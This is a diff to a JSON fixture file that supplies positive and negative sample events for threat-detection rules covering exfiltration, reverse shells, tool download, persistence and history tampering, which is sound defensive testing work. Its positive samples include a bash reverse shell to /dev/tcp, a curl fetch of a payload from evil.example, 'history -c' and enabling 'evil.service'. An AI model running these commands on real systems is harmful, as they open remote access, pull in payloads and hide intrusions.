@@ -1891,5 +1891,209 @@
         "client": "unknown-banner-format"
       }
     ]
+  },
+  "net_zeek_conn_outbound_volume_asymmetry.yml": {
+    "true_positive": {
+      "orig_bytes": 8000000,
+      "resp_bytes": 50000
+    },
+    "true_negatives": [
+      {
+        "orig_bytes": 8000000,
+        "resp_bytes": 5000000
+      },
+      {
+        "orig_bytes": 1000000,
+        "resp_bytes": 50000
+      },
+      {
+        "orig_bytes": 8000000,
+        "resp_bytes": 300000
+      }
+    ]
+  },
+  "net_zeek_ssl_cloud_storage_exfil.yml": {
+    "true_positive": {
+      "server_name": "mega.nz"
+    },
+    "true_negatives": [
+      {
+        "server_name": "www.google.com"
+      },
+      {
+        "server_name": "notmega.nz"
+      },
+      {
+        "server_name": "faketransfer.sh"
+      }
+    ]
+  },
+  "posh_ps_clipboard_capture.yml": {
+    "true_positive": {
+      "EventID": 4104,
+      "ScriptBlockText": "Get-Clipboard | Out-File C:\\temp\\clip.txt"
+    },
+    "true_negatives": [
+      {
+        "EventID": 4104,
+        "ScriptBlockText": "Get-Process | Where-Object {$_.CPU -gt 100}"
+      },
+      {
+        "EventID": 4103,
+        "ScriptBlockText": "Get-Clipboard reference in a 4103 event, wrong EventID"
+      }
+    ]
+  },
+  "proc_creation_win_local_data_staging.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\robocopy.exe",
+      "CommandLine": "robocopy C:\\Users\\alice\\Documents C:\\Users\\Public\\staged *.docx *.pdf *.xlsx /E"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\robocopy.exe",
+        "CommandLine": "robocopy C:\\Users\\alice\\Documents C:\\Backup\\Documents *.docx /E"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\robocopy.exe",
+        "CommandLine": "robocopy C:\\Users\\alice\\Documents C:\\Users\\Public\\staged *.docx"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\robocopy.exe",
+        "CommandLine": "robocopy C:\\Program Files\\App C:\\Users\\Public\\backup /E"
+      },
+      {
+        "Image": "C:\\Windows\\explorer.exe",
+        "CommandLine": "C:\\Windows\\explorer.exe"
+      }
+    ]
+  },
+  "proc_creation_win_archive_staging_non_rar.yml": {
+    "true_positive": {
+      "Image": "C:\\Program Files\\7-Zip\\7z.exe",
+      "CommandLine": "7z.exe a -pSecret123 archive.7z C:\\data\\*"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Program Files\\7-Zip\\7z.exe",
+        "CommandLine": "7z.exe a archive.7z C:\\data\\*"
+      },
+      {
+        "Image": "C:\\Program Files\\7-Zip\\7z.exe",
+        "CommandLine": "7z.exe x -pSecret123 archive.7z"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\makecab.exe",
+        "CommandLine": "makecab.exe C:\\data\\file.txt C:\\output\\file.cab"
+      }
+    ]
+  },
+  "proc_creation_lnx_reverse_shell_interpreter.yml": {
+    "true_positive": {
+      "Image": "/bin/bash",
+      "CommandLine": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
+    },
+    "true_negatives": [
+      {
+        "Image": "/bin/bash",
+        "CommandLine": "bash -c 'echo hello'"
+      },
+      {
+        "Image": "/usr/bin/nc",
+        "CommandLine": "nc -l -p 4444"
+      },
+      {
+        "Image": "/usr/bin/python3",
+        "CommandLine": "python3 script.py"
+      },
+      {
+        "Image": "/usr/bin/socat",
+        "CommandLine": "socat TCP-LISTEN:4444 STDOUT"
+      }
+    ]
+  },
+  "proc_creation_lnx_ingress_tool_transfer.yml": {
+    "true_positive": {
+      "Image": "/usr/bin/curl",
+      "CommandLine": "curl http://evil.example/payload.sh -o /tmp/payload.sh"
+    },
+    "true_negatives": [
+      {
+        "Image": "/usr/bin/curl",
+        "CommandLine": "curl https://example.com/index.html -o /home/user/index.html"
+      },
+      {
+        "Image": "/usr/bin/wget",
+        "CommandLine": "wget https://example.com/file.tar.gz"
+      },
+      {
+        "Image": "/bin/bash",
+        "CommandLine": "echo hi | bash"
+      }
+    ]
+  },
+  "proc_creation_lnx_cron_at_persistence.yml": {
+    "true_positive": {
+      "Image": "/usr/bin/crontab",
+      "CommandLine": "crontab -e"
+    },
+    "true_negatives": [
+      {
+        "Image": "/usr/bin/crontab",
+        "CommandLine": "crontab -l"
+      },
+      {
+        "Image": "/usr/bin/crontab",
+        "CommandLine": "crontab -r"
+      },
+      {
+        "Image": "/bin/ls",
+        "CommandLine": "ls -la /etc/cron.d/"
+      },
+      {
+        "Image": "/bin/cat",
+        "CommandLine": "cat /etc/cron.d/existing-job"
+      }
+    ]
+  },
+  "proc_creation_lnx_shell_history_tamper.yml": {
+    "true_positive": {
+      "Image": "/bin/bash",
+      "CommandLine": "history -c"
+    },
+    "true_negatives": [
+      {
+        "Image": "/bin/bash",
+        "CommandLine": "history | grep ssh"
+      },
+      {
+        "Image": "/bin/cat",
+        "CommandLine": "cat ~/.bash_history"
+      },
+      {
+        "Image": "/bin/ln",
+        "CommandLine": "ln -sf /dev/null /tmp/scratch-link"
+      }
+    ]
+  },
+  "proc_creation_lnx_systemd_service_persistence.yml": {
+    "true_positive": {
+      "Image": "/usr/bin/systemctl",
+      "CommandLine": "systemctl enable evil.service"
+    },
+    "true_negatives": [
+      {
+        "Image": "/usr/bin/systemctl",
+        "CommandLine": "systemctl status sshd"
+      },
+      {
+        "Image": "/usr/bin/systemctl",
+        "CommandLine": "systemctl restart nginx"
+      },
+      {
+        "Image": "/bin/bash",
+        "CommandLine": "bash -c 'echo test > /tmp/test.txt'"
+      }
+    ]
   }
 }
